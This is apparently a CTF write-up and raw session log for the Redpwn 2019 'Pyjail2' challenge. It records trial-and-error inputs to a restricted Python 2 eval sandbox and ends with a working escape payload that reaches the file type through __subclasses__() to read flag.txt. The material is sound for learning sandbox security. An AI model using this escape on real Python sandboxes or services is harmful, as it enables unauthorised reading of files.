@@ -1,0 +1,285 @@
+Challenge: Pyjail2
+
+In this challenge, we had to find a way to get the contents of a file without being able to import any modules,
+use most builtins, and were not allowed to use spaces in any commands either, so it was very challenging.
+
+This one isnt as much of a writeup, but its the process I took to solve the challenge.
+I had to learn a lot more about python and eventually found a way to print the contents of a file without using any usual python commands!
+
+
+Solution:
+
+wow! again, there's a file called flag.txt! insane!
+
+s
+now it's  s !
+Exception:  name 's' is not defined
+
+print
+now it's  print !
+Exception:  invalid syntax (<string>, line 1)
+
+ls  
+now it's  ls !
+Exception:  name 'ls' is not defined
+
+"   
+now it's  " !
+Exception:  EOL while scanning string literal (<string>, line 1)
+import
+now it's  import !
+Exception:  invalid syntax (<string>, line 1)
+
+"import os\n"  
+no spaces!
+
+
+SO finally after some testing we found something we cant do, use spaces meaning no import statements, but maybe we can splice or use equals here
+
+=
+now it's  = !
+Exception:  invalid syntax (<string>, line 1)
+
+"a=1"
+now it's  "a=1" !
+
+
+
+wait this one doesnt give us an invalid syntax error?????
+
+
+
+str.trim()
+now it's  str.trim() !
+Exception:  type object 'str' has no attribute 'trim'
+
+new exception...?
+
+help()
+now it's  help() !
+Exception:  __import__ not found
+
+
+another new exception so we cant use many functions if any
+
+
+lots of testing below:
+
+
+wow! again, there's a file called flag.txt! insane!
+__builtin__.__import__(os)
+now it's  __builtin__.__import__(os) !
+Exception:  name '__builtin__' is not defined
+copyright()
+now it's  copyright() !
+Copyright (c) 2001-2018 Python Software Foundation.
+All Rights Reserved.
+
+Copyright (c) 2000 BeOpen.com.
+All Rights Reserved.
+
+Copyright (c) 1995-2001 Corporation for National Research Initiatives.
+All Rights Reserved.
+
+Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam.
+All Rights Reserved.
+license()
+now it's  license() !
+Exception:  global name 'file' is not defined
+all()
+now it's  all() !
+Exception:  all() takes exactly one argument (0 given)
+all(1)
+now it's  all(1) !
+Exception:  'int' object is not iterable
+credits()
+now it's  credits() !
+    Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands
+    for supporting Python development.  See www.python.org for more information.
+reload()
+now it's  reload() !
+Exception:  name 'reload' is not defined
+open()
+now it's  open() !
+Exception:  name 'open' is not defined
+import
+now it's  import !
+Exception:  invalid syntax (<string>, line 1)
+exit.func_code
+now it's  exit.func_code !
+Exception:  'Quitter' object has no attribute 'func_code'
+object()
+now it's  object() !
+object.attributeX
+now it's  object.attributeX !
+Exception:  type object 'object' has no attribute 'attributeX'
+
+import os
+no spaces!
+
+
+Vuggo @ /Users/Vuggo/Dropbox/CS/ctf/ctftime/Redpwn/pyjail2 $ nc chall2.2019.redpwn.net 6007
+wow! again, there's a file called flag.txt! insane!
+all
+now it's  all !
+all()
+now it's  all() !
+Exception:  all() takes exactly one argument (0 given)
+all(1)
+now it's  all(1) !
+Exception:  'int' object is not iterable
+all(object())
+
+now it's  all(object()) !
+Exception:  'object' object is not iterable
+now it's   !
+Exception:  invalid syntax (<string>, line 1)
+all(object().attributeX)  
+now it's  all(object().attributeX) !
+Exception:  'object' object has no attribute 'attributeX'
+all(exit().attributeX)
+now it's  all(exit().attributeX) !
+Vuggo @ /Users/Vuggo/Dropbox/CS/ctf/ctftime/Redpwn/pyjail2 $ nc chall2.2019.redpwn.net 6007
+wow! again, there's a file called flag.txt! insane!
+all(exit(1).attributeX)
+now it's  all(exit(1).attributeX) !
+Vuggo @ /Users/Vuggo/Dropbox/CS/ctf/ctftime/Redpwn/pyjail2 $ nc chall2.2019.redpwn.net 6007
+wow! again, there's a file called flag.txt! insane!
+all(exit('flag.txt').attributeX)
+now it's  all(exit('flag.txt').attributeX) !
+flag.txt
+
+______
+
+OVER HERE I NOTICED THAT IF I WRAP SOMETHING:
+all(exit()) it seems to actually print something.... 
+this will be extremely important later on
+
+_________
+
+
+Vuggo @ /Users/Vuggo/Dropbox/CS/ctf/ctftime/Redpwn/pyjail2 $ nc chall2.2019.redpwn.net 6007
+wow! again, there's a file called flag.txt! insane!
+all(exit(open('flag.txt','r')) 
+now it's  all(exit(open('flag.txt','r')) !
+Exception:  unexpected EOF while parsing (<string>, line 1)
+all(exit(open('flag.txt')))
+now it's  all(exit(open('flag.txt'))) !
+Exception:  name 'open' is not defined
+getattr()
+now it's  getattr() !
+Exception:  getattr expected at least 2 arguments, got 0
+getattr(globals(),'')
+now it's  getattr(globals(),'') !
+Exception:  'dict' object has no attribute ''
+getattr(eval(),[0])
+now it's  getattr(eval(),[0]) !
+Exception:  name 'eval' is not defined
+getattr(exec(),[0])
+now it's  getattr(exec(),[0]) !
+Exception:  invalid syntax (<string>, line 1)
+getattr(dir(),[:])
+now it's  getattr(dir(),[:]) !
+Exception:  invalid syntax (<string>, line 1)
+getattr(dir(),[0])
+now it's  getattr(dir(),[0]) !
+Exception:  getattr(): attribute name must be string
+getattr(dir(),'__builtins__')
+now it's  getattr(dir(),'__builtins__') !
+Exception:  'list' object has no attribute '__builtins__'
+getattr(dir())
+now it's  getattr(dir()) !
+Exception:  getattr expected at least 2 arguments, got 1
+getattr(dir(),'struct')
+now it's  getattr(dir(),'struct') !
+Exception:  'list' object has no attribute 'struct'
+getattr(dir(),[0])
+now it's  getattr(dir(),[0]) !
+Exception:  getattr(): attribute name must be string
+execfile()
+now it's  execfile() !
+Exception:  name 'execfile' is not defined
+dir(__builtins__)
+now it's  dir(__builtins__) !
+all()
+now it's  all() !
+Exception:  all() takes exactly one argument (0 given)
+all(globals().attributeX)
+now it's  all(globals().attributeX) !
+Exception:  'dict' object has no attribute 'attributeX'
+compile()
+now it's  compile() !
+Exception:  name 'compile' is not defined
+delattr()
+now it's  delattr() !
+Exception:  delattr expected 2 arguments, got 0
+().__class__.__bases__[0].__subclasses__()[40]('./flag.txt').read()
+now it's  ().__class__.__bases__[0].__subclasses__()[40]('./flag.txt').read() !
+setattr(__builtins__,<module 'builtins' (built-in)>)
+no spaces!
+
+Vuggo @ /Users/Vuggo/Dropbox/CS/ctf/ctftime/Redpwn/pyjail2 $ nc chall2.2019.redpwn.net 6007
+wow! again, there's a file called flag.txt! insane!
+delattr(__builtins__.__dict__['name'])
+now it's  delattr(__builtins__.__dict__['name']) !
+Exception:  'name'
+
+
+
+Vuggo @ /Users/Vuggo/Dropbox/CS/ctf/ctftime/Redpwn/pyjail2 $ nc chall2.2019.redpwn.net 6007
+wow! again, there's a file called flag.txt! insane!
+system
+now it's  system !
+Exception:  name 'system' is not defined
+().__class__.__bases__[0].__subclasses__()[40](r'flag.txt').read()
+now it's  ().__class__.__bases__[0].__subclasses__()[40](r'flag.txt').read() !
+().__class__.__bases__[0].__subclasses__()[49].__module.__builtins__
+now it's  ().__class__.__bases__[0].__subclasses__()[49].__module.__builtins__ !
+Exception:  type object 'formatteriterator' has no attribute '__module'
+().__class__.__bases__[0].__subclasses__()[49]._module.__builtins__
+now it's  ().__class__.__bases__[0].__subclasses__()[49]._module.__builtins__ !
+Exception:  type object 'formatteriterator' has no attribute '_module'
+dir(().__class__.__bases__[0].__subclasses__()[49])
+now it's  dir(().__class__.__bases__[0].__subclasses__()[49]) !
+          
+now it's   !
+Exception:  invalid syntax (<string>, line 1)
+().__class__.__bases__[0].__subclasses__()[49]    
+now it's  ().__class__.__bases__[0].__subclasses__()[49] !
+().__class__.__bases__[0].__subclasses__()[49].
+now it's  ().__class__.__bases__[0].__subclasses__()[49]. !
+Exception:  invalid syntax (<string>, line 1)
+
+().__class__
+now it's  ().__class__ !
+dir(().__class__.__base__.__subclasses__())
+now it's  dir(().__class__.__base__.__subclasses__()) !
+
+getattr(().__class__.__base__.__subclasses__())
+now it's  getattr(().__class__.__base__.__subclasses__()) !
+Exception:  getattr expected at least 2 arguments, got 1
+
+().__class__.__base__.__subclasses__()  
+now it's  ().__class__.__base__.__subclasses__() !
+
+
+all(exit(().__class__.__base__.__subclasses__()))
+now it's  all(exit(().__class__.__base__.__subclasses__())) !
+[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod'>, <type 'complex'>, <type 'float'>, <type 'buffer'>, <type 'long'>, <type 'frozenset'>, <type 'property'>, <type 'memoryview'>, <type 'tuple'>, <type 'enumerate'>, <type 'reversed'>, <type 'code'>, <type 'frame'>, <type 'builtin_function_or_method'>, <type 'instancemethod'>, <type 'function'>, <type 'classobj'>, <type 'dictproxy'>, <type 'generator'>, <type 'getset_descriptor'>, <type 'wrapper_descriptor'>, <type 'instance'>, <type 'ellipsis'>, <type 'member_descriptor'>, <type 'file'>, <type 'PyCapsule'>, <type 'cell'>, <type 'callable-iterator'>, <type 'iterator'>, <type 'sys.long_info'>, <type 'sys.float_info'>, <type 'EncodingMap'>, <type 'fieldnameiterator'>, <type 'formatteriterator'>, <type 'sys.version_info'>, <type 'sys.flags'>, <type 'exceptions.BaseException'>, <type 'module'>, <type 'imp.NullImporter'>, <type 'zipimport.zipimporter'>, <type 'posix.stat_result'>, <type 'posix.statvfs_result'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class '_abcoll.Hashable'>, <type 'classmethod'>, <class '_abcoll.Iterable'>, <class '_abcoll.Sized'>, <class '_abcoll.Container'>, <class '_abcoll.Callable'>, <type 'dict_keys'>, <type 'dict_items'>, <type 'dict_values'>, <class 'site._Printer'>, <class 'site._Helper'>, <type '_sre.SRE_Pattern'>, <type '_sre.SRE_Match'>, <type '_sre.SRE_Scanner'>, <class 'site.Quitter'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>]
+
+
+Vuggo @ /Users/Vuggo/Dropbox/CS/ctf/ctftime/Redpwn/pyjail2 $ nc chall2.2019.redpwn.net 6007
+wow! again, there's a file called flag.txt! insane!
+all(exit(().__class__.__base__.__subclasses__()[40]('flag.txt').read())
+now it's  all(exit(().__class__.__base__.__subclasses__()[40]('flag.txt').read()) !
+Exception:  unexpected EOF while parsing (<string>, line 1)
+
+
+
+finally wrap all of this in all and exit AND we get:
+
+
+
+all(exit(().__class__.__base__.__subclasses__()[40]('flag.txt').read()))
+now it's  all(exit(().__class__.__base__.__subclasses__()[40]('flag.txt').read())) !
+flag{sub_sub_sub_references}
